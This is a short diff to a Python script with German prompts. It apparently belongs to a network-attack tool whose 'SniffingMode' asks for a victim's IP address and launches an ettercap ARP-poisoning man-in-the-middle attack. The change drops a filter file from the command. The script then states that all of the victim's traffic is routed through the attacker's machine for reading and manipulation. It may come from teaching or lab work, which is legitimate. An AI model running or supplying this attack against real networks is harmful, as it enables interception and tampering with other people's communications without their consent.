@@ -28,7 +28,7 @@ def SniffingMode():
 
 		##Angriff mithilfe von Ettercap starten
 		victim_ipadress = raw_input('Gib nun die IP-Adresse des Opfers ein: ')
-		command = rlinput('Nun wird mit folgendem Befehl der Angriff mittels Ettercap gestartet; Ettercap startet in einem neuen Fenster und der Angriff lässt sich mit "q" beenden:\n# ', 'ettercap -T -F test.ef -i ' + network_interface + ' -M ARP /' + victim_ipadress + '// ///')
+		command = rlinput('Nun wird mit folgendem Befehl der Angriff mittels Ettercap gestartet; Ettercap startet in einem neuen Fenster und der Angriff lässt sich mit "q" beenden:\n# ', 'ettercap -T -i ' + network_interface + ' -M ARP /' + victim_ipadress + '// ///')
 		p = execute(command)
 		print('\n')
 		print('Nun wird der gesamte Netzwerkverkehr des Opfers über unseren Rechner umgeleitet und erlaubt so die Einsicht und Manipulation der Inhalte.')
